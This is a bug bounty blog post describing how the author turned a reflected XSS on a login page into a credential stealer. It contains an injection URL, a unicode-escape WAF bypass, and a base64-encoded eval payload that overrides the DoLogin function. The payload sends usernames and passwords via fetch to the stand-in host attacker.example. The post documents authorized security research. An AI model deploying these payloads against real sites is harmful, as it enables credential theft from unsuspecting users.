---
layout: post
title: "From \"Low-Impact\" RXSS to Credential Stealer: A JS-in-JS Walkthrough"
date: 2025-08-25T08:14:54+00:00
img_dir: "/assets/2025-08-25-rxss-credential-stealer/images"
description: "From the classic “quote break” in a <script> to a login takeover: step by step, I show how a “low-impact” RXSS becomes a real credential stealer."
categories: [bugbounty]
---
![Cover]({{ page.img_dir | relative_url }}/cover.png) 

# From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough

Ethical note: the following is for educational purposes and documents a real case in an authorized context (bug bounty). Do not perform attacks on systems without permission.

During my hunt, I found an RXSS that was apparently “harmless” and had little impact because all cookies were set with the “HttpOnly” flag, so it was not possible to steal the session cookie. If I had sent the report as it was, it would have been treated as Low/Medium, so I decided to find something to present to the program company that would make it a High.
Since the vulnerability was on the login page of a web app, I decided to turn the XSS into a kind of “phishing” attack.

## Context

The login page renders several server-side variables into a `<script>` block. One of them—coming from a query parameter (`l`)—is echoed inside a JavaScript string:

```html
<script>
  /* ... */
  var AspInterfaceLanguage = "test"; // ← user-controlled
  /* ... */
</script>
```

This is the classic **JS-in-JS sink**: if you can close the string and re-enter code context, you execute arbitrary JavaScript without touching HTML at all.

### Finding the break point

The goal is to use `l` to **close** the string, **inject** code, and then **repair** the syntax so the rest of the page parses cleanly.

A minimal mental model of the injected sequence:

```
"            // end the original string
;            // finish the statement defensively
<INJECTION>  // run my JavaScript
; a = "      // resume the string the page expects
```
So the URL looks something like this: 
`/Login.asp?IdSite=0&Error=&l=test";<INJECTION>;a="`

Which is reflected in this way : 

```html
<script>
    /* ... */
    var AspInterfaceLanguage = "test"<INJCETION>;a="";
    /* ... */
</script>
```

Before proceeding with the exploit there is a clarification to be made the webapp has a WAF system in front that recognizes possible malicious javascript patterns (alert/eval etc.) and blocks requests
So to bypass this control, unicode was used in this way :

```javascript
\u0061\u006C\u0065\u0072\u0074(1) // alert(1)
```
I don't know if it's a WAF or a backend check, but it's really weak and stupid.

So the payload to trigger an alert is:
`/Login.asp?IdSite=0&Error=&l=test";\u0061\u006C\u0065\u0072\u0074(1);a="`

## Convert XSS into "Credential Stealer" to increase impact

Analyzing the login page, I noticed that the login form was managed by a JS function `DoLogin()` declared in another `<script>` tag further down. 

```html

<script>

/* ..... */

function DoLogin() {

    /* ...... */
    
    var user = Trim(FormInput.InputUtente.value)
    var password = Trim(FormInput.InputPassword.value) 
        
    /* ...... */

}

/* ..... */

</script>
```

So I thought that if I replaced the content of the `DoLogin()` function with malicious code, I would have control over the login process. For Example : 

```javascript

const DoLogin = () => {
  const pwd  = Trim(FormInput.InputPassword.value);
  const user = Trim(FormInput.InputUtente.value);

  // PoC: send to a controlled listener
  fetch("https://attacker.example/?" +
        "u=" + encodeURIComponent(user) +
        "&p=" + encodeURIComponent(pwd));
};

```
I use `const` to prevent the function from being redefined later with the legitimate one in the `<script>` tag below.

However, this payload converted to Unicode became extremely long, so I decided to use eval+base64 to make it more deliverable.

```javascript

\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('<BASE_64_PAYLOAD>'))  // eval(atob('<BASE_64_PAYLOAD>'))

```

At this point, I encountered a problem and discovered that if you use `const` or `let` inside `eval()`, the declared variables/functions are not accessible globally but remain accessible only inside `eval()`.  [eval() reference](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

So, to avoid this problem, I created a new script element that contains the payload. 

```javascript
var s=document.createElement('script');
s.textContent="const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```

Now let's encode all of the above code in base64 and insert it into the final payload.

```javascript

\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7DQpzLnRleHRDb250ZW50PSJjb25zdCBEb0xvZ2luID0gKCkgPT4ge2NvbnN0IHB3ZCA9IFRyaW0oRm9ybUlucHV0LklucHV0UGFzc3dvcmQudmFsdWUpOyBjb25zdCB1c2VyID0gVHJpbShGb3JtSW5wdXQuSW5wdXRVdGVudGUudmFsdWUpOyBmZXRjaCgnaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLz91PScrZW5jb2RlVVJJQ29tcG9uZW50KHVzZXIpKycmcD0nK2VuY29kZVVSSUNvbXBvbmVudChwd2QpKTt9IjsNCmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7'))

```

### Execution order: the tiny detail that changes everything

The **vulnerable** `<script>` (the one with var `AspInterfaceLanguage = "..."`) appears **before** the script that defines the legitimate DoLogin(). That means:

1. The payload runs **immediately** as the parser processes the first `<script>`.

2. The injector adds a new `<script>` that declares `const DoLogin` **first**.

3. When the later script tries to declare `function DoLogin(){...}`, the name is **already bound**, leaving my hook in control.


## Conclusion 

With this little trick, I turned a simple, low-impact XSS into a “Credential Stealer.” The triager evaluated and accepted it as High, and I received a bounty of €1,200.